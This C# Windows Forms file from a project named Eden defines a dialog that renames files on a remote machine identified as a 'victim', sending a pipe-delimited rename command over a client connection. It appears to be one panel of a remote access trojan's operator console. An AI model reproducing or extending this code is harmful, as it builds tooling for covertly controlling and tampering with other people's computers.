using Accessibility;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Eden
{
    public partial class frmFileRename : Form
    {
        public clsClient m_clnt;
        public string szVictimID;

        public string m_szEntryName;
        public bool m_bDirectory;

        void Received(clsClient clnt, string szVictimID, List<string> aMsg)
        {
            if (this.szVictimID != szVictimID)
                return;

            if (aMsg[0] == "file")
            {
                if (aMsg[1] == "rename")
                {
                    int nCode = int.Parse(aMsg[2]);
                    if (nCode == 1)
                    {
                        MessageBox.Show("Rename successfully", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        Close();
                    }
                }
            }
        }

        public frmFileRename()
        {
            InitializeComponent();
        }

        void setup()
        {
            textBox1.Text = m_szEntryName;
            m_clnt.ServerMessageReceived += Received;
        }

        private void frmFileRename_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(textBox1.Text))
            {
                MessageBox.Show("Name cannot be null or empty.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            if (string.Equals(m_szEntryName, textBox1.Text, StringComparison.OrdinalIgnoreCase))
            {
                MessageBox.Show("Name is same as before.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            m_clnt.SendVictim(szVictimID, $"File|rename|{m_szEntryName}|{textBox1.Text}");
        }

        private void frmFileRename_FormClosed(object sender, FormClosedEventArgs e)
        {
            m_clnt.ServerMessageReceived -= Received;
        }
    }
}
